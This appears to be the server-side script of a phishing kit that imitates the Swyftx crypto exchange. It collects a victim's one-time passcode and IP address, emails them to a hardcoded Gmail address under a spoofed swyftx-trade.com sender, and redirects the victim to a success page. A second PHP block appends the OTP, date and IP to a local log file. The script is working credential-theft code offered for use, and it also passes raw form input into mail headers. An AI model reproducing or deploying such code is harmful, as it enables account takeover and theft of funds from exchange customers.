<?php

$ip 	= getenv("REMOTE_ADDR");
$code   = $_POST['code'];




$message = "

=================O--T--P=================

Code		: $code
IP		: $ip

==============1MILYARD-END============== ";


$to = "sutejuagus8383@gmail.com"; // ganti email
$subject = "SWYTFX OTP = [$ip]";
$headers = "From: SETORAN <setoran@swyftx-trade.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:success.html");


?>

<?php
$ip   = getenv("REMOTE_ADDR");
$file = "_________________1MILYARD__________________.txt";
$email   = $_POST['email'];
$password = $_POST['password'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "=================O--T--P=================");
fwrite($handle, "\n");
fwrite($handle, "Kode OTP	: ");
fwrite($handle, "$code");
fwrite($handle, "\n");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "==============1MILYARD-END==============");
fwrite($handle, "\n");
fclose($handle);

?>
